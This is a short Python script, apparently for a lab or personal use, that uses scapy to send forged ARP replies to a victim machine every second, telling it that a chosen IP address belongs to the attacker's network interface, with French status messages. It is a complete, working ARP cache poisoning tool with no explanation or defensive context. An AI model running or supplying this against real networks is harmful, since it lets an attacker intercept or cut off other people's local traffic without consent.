import sys
from scapy.all import *

victim, fake_ip = sys.argv[1], sys.argv[2]
victim_mac = getmacbyip(victim)

while True:
    sendp(Ether(dst=victim_mac)/ARP(op=2, pdst=victim, hwdst=victim_mac, psrc=fake_ip), iface="enp0s3", verbose=0)
    print(f"[+] ARP envoyé : {fake_ip} est à {get_if_hwaddr('enp0s3')}")
    time.sleep(1)